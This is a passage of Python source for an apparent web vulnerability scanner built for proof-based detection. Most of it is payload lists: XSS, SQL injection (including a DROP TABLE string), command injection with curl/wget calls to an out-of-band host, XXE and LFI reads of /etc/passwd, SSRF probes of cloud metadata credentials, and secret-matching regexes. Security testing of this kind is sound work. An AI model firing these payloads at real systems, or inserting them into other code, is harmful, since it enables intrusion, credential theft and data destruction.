"""
VulnScanner — proof-based vulnerability detection engine.
Modules: XSS, SQLi, SSTI, LFI, SSRF, Open Redirect, Security Headers, GraphQL, IDOR.
"""

import json
import os
import threading
import time
import re
import hashlib
import random
from datetime import datetime, timezone
from typing import Any, Dict, Optional, List
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, urlunparse
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import yaml

from models.finding import Finding as _Finding
from modules.utils import (
    make_session, safe_get, safe_post, finding, log, Colors, url_in_scope,
    OOBDetectionFramework, BrowserValidator, VerificationStage,
    EvidenceStrength, ConfidenceLevel, calculate_confidence,
    evidence_strength_from_score, false_positive_risk_from_score,
    prioritize_findings, compute_priority_score,
    reset_seen_findings, _build_curl,
    enrich_finding_confidence, add_capability_confidence_reasons,
    link_finding_evidence, collect_and_link_evidence,
    safe_cookies_dict,
)
from engines import ValidationEngine, EvidenceEngine, DeduplicationEngine
from engines.baseline import BaselineFingerprinter
from engines.tech_fingerprint import TechnologyFingerprinter
from models.evidence import GraphQLSchemaEvidence, EvidenceStatus

# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '{{7*7}}',
    '${7*7}',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    # mXSS — parser mutation
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<select><option><style></style><img src=x onerror=alert(1)></select>',
]

# Framework-specific XSS payloads for React, Angular, Vue, jQuery
FRAMEWORK_XSS_PAYLOADS = {
    "react": [
        {"payload": '{{__proto__.toString.constructor("alert(1)")()}}', "sink": "dangerouslySetInnerHTML"},
        {"payload": "<img src=x onerror=alert(1)>", "sink": "dangerouslySetInnerHTML"},
    ],
    "angular": [
        {"payload": "{{constructor.constructor('alert(1)')()}}", "sink": "template"},
        {"payload": "{$on.constructor('alert(1)')()}", "sink": "template"},
        {"payload": "{{a='constructor';b='alert(1)';this[a][a](b)()}}", "sink": "template"},
        {"payload": "[innerHTML]='<img src=x onerror=alert(1)>'", "sink": "property_binding"},
    ],
    "vue": [
        {"payload": "{{constructor.constructor('alert(1)')()}}", "sink": "v-html"},
        {"payload": "{{{constructor.constructor('alert(1)')()}}}", "sink": "template"},
        {"payload": '<div v-html="\'<img src=x onerror=alert(1)>\'">', "sink": "v-html"},
    ],
    "jquery": [
        {"payload": '<img src=x onerror=alert(1)>', "sink": "$.html()"},
        {"payload": "<script>alert(1)</script>", "sink": "$.append()"},
        {"payload": "<img src=x onerror=alert(1)>", "sink": "$()"},
    ],
    "generic": [
        {"payload": "';-alert(1)-'", "sink": "eval"},
        {"payload": "\\';alert(1)//", "sink": "js_string"},
        {"payload": "</script><script>alert(1)</script>", "sink": "script_breakout"},
    ],
}

# WAF bypass payloads — encoding variants, case mutations, comment injection
WAF_BYPASS_XSS = [
    '<svg/onload=alert&#40;1&#41;>',
    '<svg/onload=alert(1)>',
    '%3Csvg/onload=alert(1)%3E',
    '%253Csvg/onload=alert(1)%253E',
    '<SvG/OnLoAd=alert(1)>',
    '<svg/onload=alert(1)<!--',
    '--><svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    '"><svg/onload=alert(1)<!--',
    "onload=alert(1)//<svg ' \"",
    'javascript:alert(1)',
    'java%00script:alert(1)',
    'java%09script:alert(1)',
    'JaVaScRiPt:alert(1)',
    '&#106;avascript:alert(1)',
    '&#x6A;avascript:alert(1)',
]

# Probe payloads for DOM sink detection
DOM_XSS_PROBES = [
    "bbh_dom_probe",
    "<img src=x onerror=alert(1)>",
    "';alert(1)//",
]

DEFAULT_XSS_PAYLOADS: dict = {
    "reflected": XSS_PAYLOADS,
    "polyglot": [
        '"><svg/onload=alert(1)>',
        "';alert(1)//",
        '${alert(1)}',
        ' " onfocus=alert(1) autofocus= ',
        'expression(alert(1))',
    ],
    "dom": [
        '<img src=x onerror=window.__bbh_xss=1>',
        '"><img src=x onerror=window.__bbh_xss=1>',
        "javascript:window.__bbh_xss=1",
    ],
    "framework": FRAMEWORK_XSS_PAYLOADS,
    "waf_bypass": WAF_BYPASS_XSS,
    "dom_probes": DOM_XSS_PROBES,
}

CONTEXT_XSS_PAYLOADS = {
    "html": [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<script>alert(1)</script>',
    ],
    "attribute": [
        '" onfocus=alert(1) autofocus= ',
        '" autofocus onfocus=alert(1) x="',
        '" onmouseover=alert(1) x="',
    ],
    "javascript": [
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        "\\';alert(1)//",
    ],
    "url": [
        "javascript:alert(1)",
        "javaScript:alert(1)",
    ],
    "dom": [
        '<img src=x onerror=window.__bbh_xss=1>',
        "\"-window.__bbh_xss=1-\"",
    ],
}

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "pls-", "ora-01756",
    "db2 sql error", "sqlite_error", "unclosed quotation mark",
    "quoted string not properly terminated", "syntax error",
    "pg_query", "sqlite3", "microsoft sql server", "jdbc",
    "sqlstate", "sql server", "pdo", "you have an error in your sql",
    "unexpected end of SQL command", "division by zero",
    "column count doesn't match", "unknown column",
]

DEFAULT_SQLI_PAYLOADS = {
    "error_based": [
        "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
        "1; DROP TABLE users--", "' UNION SELECT NULL--",
        # WAF bypass variants
        "' OR 1=1-- -", "' OR 1=1#", "' OR '1'='1' --",
        "'/**/OR/**/1=1--", "'/*!00000OR*/1=1--",
    ],
    "time_based": [
        "' AND SLEEP(5)-- -", '" AND SLEEP(5)-- -',
        "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
        # PostgreSQL, Oracle
        "' AND (SELECT pg_sleep(5))--", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    ],
    "boolean_based": [
        [" AND 1=1-- -", " AND 1=2-- -"],
        ["' AND '1'='1", "' AND '1'='2"],
        ["' AND 1=1--", "' AND 1=2--"],
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        # ORDER BY column counting
        "' ORDER BY 1--",
        "' ORDER BY 2--",
        "' ORDER BY 3--",
        "' ORDER BY 4--",
        "' ORDER BY 5--",
        "' ORDER BY 6--",
        "' ORDER BY 7--",
        "' ORDER BY 8--",
        "' ORDER BY 9--",
        "' ORDER BY 10--",
    ],
    "oob": [
        "'; exec xp_dirtree '//{oob}/test'--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', '{oob}', '\\\\test'))",
        "' OR 1=1 INTO OUTFILE '\\\\{oob}\\test'--",
        # DNS-based OOB
        "' AND (SELECT utl_inaddr.get_host_address('{oob}') FROM dual)--",
        "' AND (SELECT pg_read_file('\\\\{oob}\\test'))--",
    ],
}

# POST body SQLi payloads — JSON, XML, form-encoded
POST_SQLI_PAYLOADS = {
    "json": [
        '{"id": "1\' OR 1=1--"}',
        '{"id": "1\' AND SLEEP(5)--"}',
        '{"query": "1\' UNION SELECT NULL--"}',
    ],
    "xml": [
        '<?xml version="1.0"?><id>1\' OR 1=1--</id>',
        '<?xml version="1.0"?><query>1\' UNION SELECT NULL--</query>',
    ],
    "form": [
        "id=1' OR 1=1--",
        "id=1' AND SLEEP(5)--",
        "query=1' UNION SELECT NULL--",
    ],
}

SSTI_PAYLOADS = {
    "arithmetic": [
        "{{7*7}}", "{{7+7}}", "{{7-7}}",
        "${7*7}", "${7+7}",
        "<%=7*7%>", "<%=7+7%>",
        "#{7*7}", "#{7+7}",
    ],
    "engine_fingerprint": [
        ("twig", "{{7*'7'}}", "49"),
        ("jinja2", "{{7*'7'}}", "7777777"),
        ("freemarker", "${7*7}", "49"),
        ("velocity", "#set($x=7*7)$x", "49"),
        ("razor", "@(7*7)", "49"),
        ("smarty", "{$smarty.now}", ""),
        ("mustache", "{{7*7}}", "49"),
    ],
    "read_proof": [
        "{{config}}", "{{self._TemplateReference__context}}",
        "${7*7}", "#{7*7}",
    ],
}

SSTI_ENGINE_PATTERNS = {
    "jinja2": [
        re.compile(r"\{\{7\*'7'\}\}.*?7777777"),
        re.compile(r"\{\{config\}\}"),
        re.compile(r"cycler|joiner|namespace|lipsum|dict|url_for|get_flashed_messages"),
    ],
    "twig": [
        re.compile(r"\{\{7\*'7'\}\}.*?49"),
        re.compile(r"\{\{7\*7\}\}"),
        re.compile(r"self\._TemplateReference__context"),
    ],
    "freemarker": [
        re.compile(r"\$\{7\*7\}"),
    ],
    "smarty": [
        re.compile(r"\{\$smarty"),
    ],
}

LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd", "C:\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[boot loader]",
    "for 16-bit app support", "daemon:x:",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:8080", "http://localhost:8443",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "dest", "destination", "redirect",
    "next", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "return", "page", "feed", "host",
    "port", "to", "out", "view", "dir", "show", "navigation", "open",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "computeMetadata",
    "iam/security-credentials", "metadata",
]

XXE_PAYLOADS = {
    "in_band": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    ],
    "error_based": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexist">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>&xxe;</root>',
    ],
    "oob": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oob}/xxe">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "ftp://{oob}/xxe">%xxe;]><root>test</root>',
    ],
    "blind": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>&send;</root>',
    ],
}

XXE_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "daemon:x:", "bin:x:",
    "www-data:x:", "ROOT", "Administrator",
]

CMD_INJECTION_PAYLOADS = {
    "unix": [
        ("; id", "uid="),
        ("| id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        ("; uname -a", "Linux"),
        ("| uname -a", "Linux"),
        ("; whoami", ""),
        ("| whoami", ""),
        ("; ping -c 1 127.0.0.1", ""),
        ("| ping -c 1 127.0.0.1", ""),
        ("; sleep 5", ""),
        ("| sleep 5", ""),
        ("`sleep 5`", ""),
    ],
    "windows": [
        ("| ver", "Microsoft"),
        ("& ver", "Microsoft"),
        ("; systeminfo", "OS"),
        ("| systeminfo", "OS"),
        ("& ping -n 5 127.0.0.1", ""),
        ("| ping -n 5 127.0.0.1", ""),
        ("& timeout 5", ""),
        ("| timeout 5", ""),
    ],
    "time_based": [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("| ping -c 5 127.0.0.1", 5),
        ("& ping -n 5 127.0.0.1", 5),
    ],
    "oob": [
        "| nslookup {oob}",
        "; nslookup {oob}",
        "`nslookup {oob}`",
        "| curl http://{oob}/cmd",
        "; curl http://{oob}/cmd",
        "| wget http://{oob}/cmd",
        "; wget http://{oob}/cmd",
    ],
}

CMD_INJECTION_OUTPUT_SIGNATURES = [
    "uid=", "gid=", "groups=", "load average",
]
CMD_INJECTION_OUTPUT_SIGNATURES_WIN = [
    "boot loader", "for 16-bit app support",
]

SENSITIVE_PATTERNS = [
    ("AWS Access Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("AWS Secret Key", re.compile(r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+=]{40}")),
    ("GitHub Token", re.compile(r"(?:ghp_|github_pat_|gho_|ghu_|ghs_|ghr_)[A-Za-z0-9_]{36,}")),
    ("Slack Token", re.compile(r"(?:xox[baprs]-|xapp-)[0-9A-Za-z-]{10,}")),
    ("Private RSA Key", re.compile(r"-----BEGIN RSA PRIVATE KEY-----")),
    ("Private EC Key", re.compile(r"-----BEGIN EC PRIVATE KEY-----")),
    ("JWT Token", re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")),
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com",
    "https://evil.com%2F%2F", "/\\evil.com",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnUrl", "next", "url", "goto", "dest", "destination",
    "continue", "forward", "target", "redir", "r", "u",
]

CSRF_TOKEN_NAMES = {
    "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
    "token", "csrf", "xsrf-token", "xsrf_token",
    "anti_csrf_token", "_csrf", "_token",
}

COMMON_DIRFUZZ_PATHS = [
    "admin/", "login/", "dashboard/", "config/", "backup/", "uploads/",
    "portal/", "server-status", "shell/", "wp-admin/", "wp-login.php",
    "phpmyadmin/", "vendor/", ".git/", ".env", ".gitignore",
]

EXPOSED_FILES = [
    ".env", ".env.local", ".env.backup", "/.git/config", "/.gitignore",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/phpinfo.php",
    "/wp-config.php", "/wp-config.php.bak", "/.DS_Store", "/web.config",
    "/web.config.bak", "/config.php", "/config.xml", "/.htaccess",
    "/.htpasswd", "/web.xml", "/pom.xml", "/.aws/credentials",
    "/.ssh/id_rsa", "/Dockerfile", "/.dockerignore", "/docker-compose.yml",
    "/secrets.txt", "/passwords.txt", "/.env.example",
    # CMS-specific
    "/wp-admin", "/wp-admin/admin-ajax.php", "/wp-json/", "/wp-json/wp/v2/users",
    "/xmlrpc.php", "/wp-content/debug.log", "/wp-content/uploads/",
    "/wp-includes/", "/wp-config.php~", "/wp-config.php.old",
    "/wp-config.php.save", "/wp-config.php.bak",
    "/administrator/manifests/files/joomla.xml", "/administrator/",
    "/components/", "/modules/", "/plugins/",
    "/sites/default/settings.php", "/sites/default/files/",
    "/CHANGELOG.txt", "/INSTALL.txt", "/UPGRADE.txt",
    # Additional sensitive files
    "/logs/", "/error.log", "/access.log", "/debug.log",
    "/dump.sql", "/db_dump.sql", "/database.sql",
    "/appsettings.json", "/appsettings.Development.json",
    "/configuration.json", "/settings.json", "/config.json",
    "/local.xml", "/parameters.yml", "/parameters.yaml",
    "/Procfile", "/requirements.txt", "/composer.json", "/composer.lock",
    "/package.json", "/package-lock.json", "/yarn.lock",
    "/npm-debug.log", "/yarn-error.log",
    "/sftp-config.json", "/.ftpconfig", "/.remote-sync.json",
    "/credentials", "/.credentials", "/credentials.json",
    "/api/keys", "/api-key", "/api_key",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/oauth/token", "/oauth/authorize",
    "/_debug/", "/debug/", "/dev/", "/test/",
    "/server-status", "/server-info",
    "/actuator/health", "/actuator/info", "/actuator/env", "/actuator/beans",
    "/actuator/mappings", "/actuator/configprops",
    "/metrics", "/health", "/info", "/env", "/beans",
    "/console/", "/manager/", "/jmx/",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
}

TAKEOVER_SIGNATURES = [
    "NoSuchBucket", "There isn't a GitHub Pages site here.",
    "Fastly error: unknown domain", "No such app",
    "The requested URL was not found on this server.",
    "A DNS leak or misconfiguration", "NoSuchDomain", "No such host",
]

CLICKJACKING_SAFE_DIRECTIVES = [
    "frame-ancestors 'none'", "frame-ancestors 'self'", "frame-ancestors https:",
]

# ── CMS-specific vulnerability checks ────────────────────────────────────────

CMS_CHECKS: dict[str, list[dict]] = {
    "WordPress": [
        {"path": "/wp-json/wp/v2/users", "name": "WordPress User Enumeration", "severity": "medium",
         "check": lambda b: '"id"' in b and '"name"' in b},
        {"path": "/wp-json/", "name": "WordPress REST API Exposure", "severity": "low",
         "check": lambda b: '"namespaces"' in b},
        {"path": "/xmlrpc.php", "name": "WordPress XML-RPC Enabled", "severity": "medium",
         "check": lambda b: "XML-RPC" in b or "system.listMethods" in b},
        {"path": "/wp-content/debug.log", "name": "WordPress Debug Log Exposed", "severity": "high",
         "check": lambda b: "PHP" in b or "Stack trace" in b or "WordPress" in b},
        {"path": "/wp-content/uploads/", "name": "WordPress Uploads Directory Listing", "severity": "medium",
         "check": lambda b: "Index of" in b or "wp-content/uploads" in b},
        {"path": "/readme.html", "name": "WordPress Version Disclosure", "severity": "low",
         "check": lambda b: "WordPress" in b},
        {"path": "/wp-admin/admin-ajax.php", "name": "WordPress Unauthenticated AJAX", "severity": "low",
         "check": lambda b: b.strip() in ("0", "-1")},
        {"path": "/?author=1", "name": "WordPress Author Enumeration", "severity": "low",
         "check": lambda b: "author" in b.lower() and ("/author/" in b or "author-1" in b)},
    ],
    "Drupal": [
        {"path": "/user/register", "name": "Drupal Registration Open", "severity": "medium",
         "check": lambda b: "form" in b and ("register" in b or "password" in b)},
        {"path": "/node/1", "name": "Drupal Node Access", "severity": "medium",
         "check": lambda b: "node" in b and "not found" not in b.lower()},
        {"path": "/CHANGELOG.txt", "name": "Drupal Version Disclosure", "severity": "low",
         "check": lambda b: "Drupal" in b},
    ],
    "Joomla": [
        {"path": "/administrator/", "name": "Joomla Admin Panel Exposed", "severity": "medium",
         "check": lambda b: "joomla" in b.lower() or "administration" in b.lower()},
        {"path": "/components/", "name": "Joomla Components Directory Listing", "severity": "low",
         "check": lambda b: "Index of" in b or "/components/" in b},
    ],
}

# ── Scanner class ─────────────────────────────────────────────────────────────

class VulnScanner:
    def __init__(self, config: dict, recon_data: dict, container=None):
        self.config    = config
        self.recon     = recon_data
        self.container = container
        self.timeout   = config.get("timeout", 10)
        self.threads   = config.get("threads", 10)
        self.verbose   = config.get("verbose", False)
        self.session   = make_session(config)
        self.base_url  = config.get("target", "").rstrip("/")
        self.findings  : list[dict] = []
        self._lock     = threading.Lock()
        self.dedup     = DeduplicationEngine()

        if container:
            self.validation = container.validation_engine
            self.evidence   = container.evidence_engine
            self.oob        = (container.oob_framework
                               if container.oob_framework
                               else OOBDetectionFramework(config))
            self.browser    = (container.browser_validator
                               if container.browser_validator
                               else BrowserValidator(config))
        else:
            self.oob       = OOBDetectionFramework(config)
            self.browser   = BrowserValidator(config)
            self.validation = ValidationEngine(config)
            self.evidence   = EvidenceEngine()

        # Phase 3: new scanner delegates (scanners/ package)
        self._use_new_scanners = config.get("use_new_scanners", True)
        self._container = container

        # Phase 4: auto-discovered scanner instances
        self._scanner_instances: dict[str, Any] = {}
        if self._use_new_scanners:
            from scanners import discover_scanner_classes
            for name, cls in discover_scanner_classes().items():
                try:
                    self._scanner_instances[name] = cls(self.config, self.recon, container=self._container)
                except Exception as e:
                    log(f"  [!] Failed to init scanner {name}: {e}", Colors.RED, verbose_only=True, verbose=self.verbose)

        self.waf_detected = False
        self.baselines    = BaselineFingerprinter(self.session, self.timeout)
        self.tech_fingerprinter = TechnologyFingerprinter(self.session, self.timeout)
        self._prepared    = False
        self._second_order_store: dict[str, list[dict]] = {}

    # ── Dedup Wrapper ────────────────────────────────────────────────────

    def _add(self, f: _Finding) -> bool:
        if not f:
            return False
        with self._lock:
            if not self.dedup.add_legacy(f):
                return False
            enrich_finding_confidence(f)
            add_capability_confidence_reasons(f)
            sev = f.get("severity", "info").upper()
            title = f.get("title", "Finding")[:60]
            url = f.get("url", "")[:60]
            stage = f.get("verification_stage", "detected").replace("_", " ").title()
            score = f.get("confidence_score", 0)
            log(f"  [FOUND] [{sev}] {title} @ {url} [{stage}, {score:.0f}/100]",
                Colors.RED if sev in ("CRITICAL", "HIGH") else Colors.YELLOW)

            if hasattr(self, 'evidence'):
                link_finding_evidence(f, self.evidence)
            return True

    def _get_findings(self) -> list[_Finding]:
        raw = self.dedup.get_findings()
        return prioritize_findings(raw)

    def _collect_and_link_evidence(self, f: _Finding, evidence_list: list) -> None:
        """Store and link typed evidence objects for a finding (legacy scanner helper)."""
        collect_and_link_evidence(f, evidence_list, self.evidence)

    # ── ScannerBase Dispatcher (Phase 4) ──────────────────────────────

    def _dispatch_to_scanner(self, name: str, target_urls: list[str] | None = None) -> list[_Finding] | None:
        """Dispatch to a ScannerBase subclass if available.

        New scanner findings are ALWAYS added to dedup regardless of maturity.

        Returns findings list if the scanner was found, ran,
        AND its SCANNER_MATURITY >= 4 (mature enough to replace legacy).
        Returns None to signal that the caller should fall back to legacy logic
        (either no scanner available, or SCANNER_MATURITY < 4).
        """
        if not self._use_new_scanners:
            return None
        inst = self._scanner_instances.get(name)
        if inst is None:
            return None
        inst.session = self.session
        # Inherit parent's scan-prep state so ScannerBase skips redundant WAF/baseline probes
        if self._prepared:
            inst.waf_detected = self.waf_detected
            inst._prepared = True
        results = inst.scan(target_urls)
        extra   = inst.finalize()
        new_findings = results + extra
        deduped = []
        for f in new_findings:
            if f:
                with self._lock:
                    if self.dedup.add_legacy(f):
                        deduped.append(f)
        new_findings = deduped
        # Phase 3: maturity gate — only skip legacy for mature scanners (>=4)
        maturity = getattr(inst, 'SCANNER_MATURITY', 1)
        if maturity >= 4:
            return new_findings
        return None

    # ── Re-verification Loop (DEPRECATED) ─────────────────────────────

    def _run_reverification_loop(self) -> None:
        """DEPRECATED: VerificationEngine in engines/verification_engine.py now handles
        all verification paths. This method is kept only for backward compatibility
        with use_new_scanners=False code paths."""
        all_findings = self.dedup.get_findings()
        attempt_count: dict[str, int] = {}
        for f in all_findings:
            fp = f.get("fingerprint", "")
            stage = f.get("verification_stage", "").lower()
            if stage not in ("detected",):
                continue
            vuln_type = f.get("vuln_type", "").lower()
            url = f.get("url", "")
            param = f.get("parameter", "")
            signal_count = len(f.get("validation_steps", []))
            if signal_count >= 2:
                continue

            # Track attempts; discard after 3
            attempt_count[fp] = attempt_count.get(fp, 0) + 1
            if attempt_count[fp] > 3:
                log(f"  [Re-verify] Discarding {vuln_type} at {url} after 3 failed re-verifications", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                continue

            if "sqli" in vuln_type.lower():
                # Try time-based if error-based was used
                payloads = self._load_payloads("sqli")
                original_val = f.get("original_value", "1")
                signals, _ = self._sqli_test_parameter(url, param or "id", original_val, payloads, self.config.get("oob_host"))
                if signals.get("time") or signals.get("union") or signals.get("oob"):
                    f["verification_stage"] = VerificationStage.VALIDATED.value
                    log(f"  [Re-verify] SQLi at {url} promoted to VALIDATED via alternative signal", Colors.GREEN, verbose_only=True, verbose=self.verbose)

            elif "xss" in vuln_type.lower():
                # Retry with simpler payload
                simple_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
                for sp in simple_payloads:
                    test_url = self._inject_param(url, param or "q", sp)
                    exec_result = self.browser.check_xss_execution(test_url, sp)
                    if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                        f["verification_stage"] = VerificationStage.VERIFIED.value
                        log(f"  [Re-verify] XSS at {url} promoted to EXPLOITABLE via Playwright re-check", Colors.GREEN, verbose_only=True, verbose=self.verbose)
                        break

    # ── OOB Promotion ─────────────────────────────────────────────────

    def _promote_finding_by_oob(self, payload: str) -> bool:
        """Promote a finding to VERIFIED when an OOB callback matches its payload."""
        for f in self.dedup.get_findings():
            evidence_list = f.get("evidence", [])
            if not isinstance(evidence_list, list):
                evidence_list = [evidence_list] if evidence_list else []
            steps = str(f.get("validation_steps", []))
            payload_in = payload in steps or any(payload in str(ev) for ev in evidence_list)
            if not payload_in:
                for val in f.values():
                    if isinstance(val, str) and payload in val:
                        payload_in = True
                        break
            if payload_in:
                f["verification_stage"] = VerificationStage.VERIFIED.value
                f["confidence_score"] = 100
                log(f"  [OOB] {f.get('vuln_type', '')} @ {f.get('url', '')} promoted to VERIFIED",
                    Colors.GREEN)
                return True
        return False

    # ── Chain Analysis ────────────────────────────────────────────────

    @staticmethod
    def _origin(url: str) -> str:
        """Extract scheme + netloc from a URL for origin comparison."""
        try:
            p = urlparse(url)
            return f"{p.scheme}://{p.netloc}".lower()
        except Exception:
            return ""

    @staticmethod
    def _is_exploitable(f: dict) -> bool:
        """Chain-quality check: Stage 3+ (exploitable/verified)."""
        stage = f.get("verification_stage", "").lower()
        return stage in ("exploitable", "verified")

    @staticmethod
    def chain_analysis(findings: list) -> list:
        """Detect exploitable chains and enrich impact fields.

        Only pairs findings that are both Stage 3+ (exploitable/verified)
        and share the same origin (scheme + host).
        """
        chains_found: list[dict] = []
        exploitable = [f for f in findings if VulnScanner._is_exploitable(f)]

        # CSRF + XSS (same origin) → ATO
        csrf = [f for f in exploitable if "csrf" in f.get("vuln_type", "").lower() and f.get("url")]
        xss = [f for f in exploitable if "xss" in f.get("vuln_type", "").lower() and f.get("url")]
        for c in csrf:
            c_origin = VulnScanner._origin(c["url"])
            match = next((x for x in xss if VulnScanner._origin(x["url"]) == c_origin), None)
            if match:
                cf = finding(
                    vuln_type="Chained: CSRF + XSS → Account Takeover",
                    url=c["url"] + " & " + match["url"],
                    severity="critical",
                    details="CSRF vulnerabilities allow an attacker to forge requests; combined with stored XSS, this enables silent account takeover without user interaction beyond visiting a page.",
                    evidence=f"Same-origin CSRF ({c['url']}) + XSS ({match['url']})",
                    request=f"Chain of:\n  CSRF: {_build_curl('GET', c['url'], {})}\n  XSS: {_build_curl('GET', match['url'], {})}",
                    response_excerpt=f"See individual findings at {c['url']} and {match['url']} for full response context.",
                    verification_stage=VerificationStage.VALIDATED.value,
                    steps_to_reproduce=[
                        f"1. Trigger XSS at {match['url']} to inject CSRF payload",
                        f"2. Victim visits page; CSRF fires to {c['url']}",
                        "3. Account state changed without victim interaction",
                    ],
                )
                if cf:
                    cf["chains"] = True
                    cf["impact"] = "Full account takeover via CSRF-triggered stored XSS payload injection."
                    chains_found.append(cf)
                break

        # SSRF (exploitable only) → RCE potential
        ssrf = [f for f in exploitable if "ssrf" in f.get("vuln_type", "").lower()]
        if ssrf:
            cf = finding(
                vuln_type="Chained: SSRF → Internal Service Enumeration / RCE",
                url=ssrf[0].get("url", ""),
                severity="critical",
                details="SSRF can be leveraged to probe internal services, access cloud metadata endpoints, or exploit internal-facing RCE (e.g., Jenkins, Hadoop, Consul).",
                evidence=f"Exploitable SSRF: {len(ssrf)} finding(s)",
                request=_build_curl("GET", ssrf[0].get("url", ""), {}),
                response_excerpt=f"SSRF at {ssrf[0].get('url', '')} can reach internal services; full response in individual finding.",
                verification_stage=VerificationStage.EXPLOITABLE.value,
                steps_to_reproduce=[
                    f"1. Send crafted request to {ssrf[0].get('url', '')} with SSRF payload",
                    "2. Observe callback on OOB listener or probe internal services",
                    "3. Use access to internal network for lateral movement or RCE",
                ],
            )
            if cf:
                cf["chains"] = True
                cf["impact"] = "Potential lateral movement and remote code execution on internal infrastructure."
                chains_found.append(cf)

        # IDOR + sensitive data (same origin) → PII breach
        idor = [f for f in exploitable if "idor" in f.get("vuln_type", "").lower() or "id" in f.get("parameter", "").lower()]
        sensitive = [f for f in exploitable if "sensitive" in f.get("vuln_type", "").lower()]
        for i in idor:
            i_origin = VulnScanner._origin(i["url"])
            match = next((s for s in sensitive if VulnScanner._origin(s["url"]) == i_origin), None)
            if match:
                cf = finding(
                    vuln_type="Chained: IDOR + Sensitive Data Exposure → PII Breach",
                    url=i["url"] + " & " + match["url"],
                    severity="critical",
                    details="IDOR vulnerabilities allow enumerating user/object identifiers; combined with sensitive data exposure, this enables mass PII harvesting.",
                    evidence=f"Same-origin IDOR ({i['url']}) + Sensitive Data ({match['url']})",
                    request=f"Chain of:\n  IDOR: {_build_curl('GET', i['url'], {})}\n  Sensitive: {_build_curl('GET', match['url'], {})}",
                    response_excerpt=f"See individual findings at {i['url']} and {match['url']} for full response context.",
                    verification_stage=VerificationStage.EXPLOITABLE.value,
                    steps_to_reproduce=[
                        f"1. Enumerate IDs at {i['url']} using sequential/predictable patterns",
